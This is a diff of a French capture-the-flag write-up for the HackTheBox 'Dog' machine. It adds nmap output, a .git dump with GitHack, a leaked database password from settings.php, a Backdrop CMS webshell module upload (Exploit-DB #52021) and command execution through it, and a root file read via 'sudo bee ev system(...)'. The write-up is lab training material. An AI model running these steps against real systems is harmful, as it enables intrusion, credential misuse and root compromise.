@@ -6,19 +6,58 @@ draft: false
 summary: 'Ce défi exploite des failles dans un CMS exposé (Backdrop CMS) et une escalade de privilèges via un binaire mal configuré (sudo bee).'
 ---
 
+<div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2rem' }}>
+  <img
+    src="/static/images/dog/dog_logo.png"
+    alt="dog_logo"
+    style={{ width: '250px', maxWidth: '100%' }}
+  />
+</div>
+
 # 🧠 Types de vulnérabilités exploitées
 
-1. .git directory leakage : exposition publique du répertoire .git accessible via HTTP.
-2. Informations sensibles exposées dans un fichier de configuration (settings.php).
-3. RCE (Remote Code Execution) dans Backdrop CMS via upload de module malveillant.
-4. Escalade de privilèges via un binaire sudo mal configuré.
+1. **.git directory leakage** : exposition publique du répertoire .git accessible via HTTP.
+2. **Informations sensibles** exposées dans un fichier de configuration (settings.php).
+3. **RCE** (Remote Code Execution) dans Backdrop CMS via upload de module malveillant.
+4. **Escalade de privilèges** via un binaire sudo mal configuré.
 
 # 🧭 Méthodologie étape par étape
 
 ## 🔍 1. Scan initial & reconnaissance
 
 • Scan des ports → ports 22 (SSH) et 80 (HTTP) sont ouverts.
-![nmap](/static/images/dog/nmap.png)
+
+```
+$ nmap -sC -sV 10.10.11.58
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:07 CEST
+Nmap scan report for dog.htb (10.10.11.58)
+Host is up (0.34s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
+|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
+|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.md /web.config /admin
+| /comment/reply /filter/tips /node/add /search /user/register
+|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+| http-git:
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
+|_http-title: Home | Dog
+1234/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.85 seconds
+```
 
 ## 🗂 2. Recherche de chemins sensibles
 
@@ -97,27 +136,73 @@ Target: http://10.10.11.58/
 
 ## 🧑‍💻 3. Exfiltration du dépôt Git
 
-◇ Utilisation de GitHack pour extraire le contenu
+◇ Utilisation de **GitHack** pour extraire le contenu
 
 ```
 python3 ../GitHack/GitHack.py http://10.10.11.58/.git/
 ```
 
-cd 10.10.11.58/
+```
+$ ls 10.10.11.58
+core   index.php  LICENSE.txt  robots.txt    sites
+files  layouts    README.md    settings.php  themes
+```
 
-◇ Explore settings.php pour trouver les identifiants de la base de données (et potentiellement un mot de passe réutilisé).
+◇ Explore **settings.php** pour trouver les identifiants de la base de données (et potentiellement un mot de passe réutilisé).
+
+```
+<?php
+/**
+ * @file
+ * Main Backdrop CMS configuration file.
+ */
+
+/**
+ * Database configuration:
+ *
+ * Most sites can configure their database by entering the connection string
+ * below. If using primary/replica databases or multiple connections, see the
+ * advanced database documentation at
+ * https://api.backdropcms.org/database-configuration
+ */
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+$database_prefix = '';
+```
+
+◇ Découverte dans **settings.php** du mot de passe utilisé pour l'accès à la base de données :
+
+```
+BackDropJ2024DS2024
+```
 
 ## 🔐 4. Tentative de connexion CMS
 
-◇ Tente de se connecter avec support@dog.htb, sans succès.
+![login](/static/images/dog/login.png)
+◇ **Recherche d'adresses e-mail** pour pouvoir se connecter → **tiffany@dog.htb** trouvée
 
-◇ Recherche dans le code exfiltré un autre mail (tiffany@dog.htb) → connexion réussie avec BackDropJ20....
+```
+grep -E -i -r '[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' .
+
+./README.md:[security@backdropcms.org](mailto:security@backdropcms.org).
+./README.md:  desktop and mobile browsers. *(Contact info@backdropcms.org for access
+./README.md:  for development. *(Contact info@backdropcms.org for a license.)*
+./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
+```
+
+◇ Tente de se connecter avec tiffany@dog.htb → **connexion réussie** avec BackDropJ2024DS2024
 
 ## 💥 5. Exploitation RCE
 
-◇ Télécharge un exploit Backdrop CMS (Exploit-DB #52021).
+◇ **Vérifie les vulnérabilités** connues sur Backdrop CMS -> Télécharge un exploit Backdrop CMS (**Exploit-DB #52021**).
 
-◇ Le script Python (python3 exploit.py http://10.10.11.58) génère un fichier shell.zip, non accepté par Backdrop.
+![exploit](/static/images/dog/exploit_rce.png)
+
+L’exploit abuse de la fonctionnalité d’installation de modules personnalisés dans l’interface admin de Backdrop CMS :
+
+- **crée un faux module** contenant un fichier shell.info (descripteur de module valide) + un fichier shell.php (webshell PHP avec champ cmd).
+- compresse le tout dans une archive shell.zip.
+
+◇ Execute le script Python (python3 52021.py http://10.10.11.58) et génère un fichier shell.zip, non accepté par Backdrop.
 
 ◇ Solution : recréer un .tar propre à partir du dossier généré.
 
@@ -125,13 +210,31 @@ cd 10.10.11.58/
 tar -cf shell.tar shell/
 ```
 
+```
+$ ls
+52021.py  output_dir_git  shell  shell.tar  shell.zip
+```
+
+◇ Se connecte à l’interface admin et téléverse le module via /admin/modules/install.
+
+![chemin](/static/images/dog/chemin_upload.png)
+
 ◇ Upload sur /admin/modules/install.
 
-◇ Accès à ta webshell via :
+![upload](/static/images/dog/upload.png)
+![succes](/static/images/dog/succes.png)
+
+◇ Accède à la webshell via :
 
 ```
 http://10.10.11.58/modules/shell/shell.php?cmd=whoami
 ```
+
+◇ Tape la commande :
+![commande](/static/images/dog/commande.png)
+
+◇ Récupère la liste des utilisateurs -> johncusack
+![passwd](/static/images/dog/passwd.png)
 
 ## 🔑 6. Accès utilisateur via SSH
 
@@ -163,6 +266,8 @@ sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
 ```
 
 ◇ ✅ Récupération du flag root.txt
+
+---
 
 # ✅ Checklist réutilisable pour d'autres labs similaires
 
